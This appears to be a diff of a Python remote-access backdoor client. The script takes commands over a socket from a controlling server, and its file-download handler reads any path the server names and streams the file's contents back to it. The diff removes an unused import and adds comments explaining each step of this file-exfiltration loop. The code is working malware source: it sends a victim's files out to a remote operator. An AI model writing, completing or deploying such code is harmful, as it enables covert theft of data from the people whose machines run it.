@@ -1,4 +1,3 @@
-from re import S
 import socket, subprocess, os, sys
 import random
 from time import sleep
@@ -91,16 +90,16 @@ while True:
                 s.send("ACK".encode())
                 data = s.recv(1024)
     elif command == "DOWNLOAD_FILE_FROM_S3RVER":
-        s.send("READY".encode())
+        s.send("READY".encode()) #Tell server client is ready for download
         try:
-            path = s.recv(1024).decode()
-            with open(path,"rb") as f:
-                data = f.read(1024)
-                while data:
-                    s.send(data)
-                    if s.recv(1024).decode() == "ACK":
-                        data = f.read(1024)
-                    else:
+            path = s.recv(1024).decode() #Get the path of file to download
+            with open(path,"rb") as f: #Open the file
+                data = f.read(1024) #Read 1024bytes and store as var
+                while data: #While the var is not None
+                    s.send(data) #Send the data to the server
+                    if s.recv(1024).decode() == "ACK": #If the server recieved it, it will send ACK
+                        data = f.read(1024) #Read more and repeat
+                    else: #If the server did not send ACK then break the loop
                         break
                         
             s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
